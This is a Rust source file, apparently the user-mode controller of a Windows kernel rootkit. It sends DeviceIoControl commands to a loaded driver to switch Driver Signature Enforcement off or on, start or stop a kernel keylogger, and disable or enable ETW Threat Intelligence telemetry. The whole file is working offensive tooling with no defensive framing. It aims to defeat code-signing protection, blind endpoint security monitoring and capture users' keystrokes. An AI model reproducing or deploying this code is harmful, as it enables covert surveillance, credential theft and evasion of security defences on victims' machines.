use {
    log::*,
    crate::utils::open_driver,
    shared::structs::{Keylogger, DSE, ETWTI},
    std::{ffi::c_void, mem::size_of, ptr::null_mut},
    windows_sys::Win32::{
        System::IO::DeviceIoControl,
        Foundation::{CloseHandle, GetLastError, HANDLE},
    },
};

pub struct Misc {
    driver_handle: HANDLE,
}

impl Misc {
    pub fn new() -> Self {
        let driver_handle = open_driver().expect("Failed to open driver");
        Misc { driver_handle }
    }

    pub fn dse(self, ioctl_code: u32, enable: bool) {
        debug!("Preparing DSE structure for {}", if enable { "enabling" } else { "disabling" });
        let mut info_dse = DSE { enable };

        debug!("Sending DeviceIoControl command to {} DSE", if enable { "enable" } else { "disable" });
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut info_dse as *mut _ as *mut c_void,
                size_of::<DSE>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl failed with status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            info!("Driver Signature Enforcement (DSE) {}", if enable { "enable" } else { "disable" });
        }
    }

    pub fn keylogger(self, ioctl_code: u32, state: bool) {
        debug!("Preparing Keylogger structure for {}", if state { "start" } else { "stop" });
        let mut keylogger = Keylogger { enable: state };

        debug!("Sending DeviceIoControl command to {} Keylogger", if state { "start" } else { "stop" });
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut keylogger as *mut _ as *mut c_void,
                std::mem::size_of::<Keylogger>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            info!("Keylogger {}", if state { "start" } else { "stop" })
        }
    }

    pub fn etwti(self, ioctl_code: u32, enable: bool) {
        debug!("Preparing ETWTI structure for {}", if enable { "enabling" } else { "disabling" });
        let mut etwti = ETWTI { enable };

        debug!("Sending DeviceIoControl command to {} ETWTI", if enable { "enable" } else { "disable" });
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut etwti as *mut _ as *mut c_void,
                std::mem::size_of::<ETWTI>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            info!("ETWTI {}", if enable { "enable" } else { "disable" })
        }
    }
}

impl Drop for Misc {
    fn drop(&mut self) {
        debug!("Closing the driver handle");
        unsafe { CloseHandle(self.driver_handle) };
    }
}
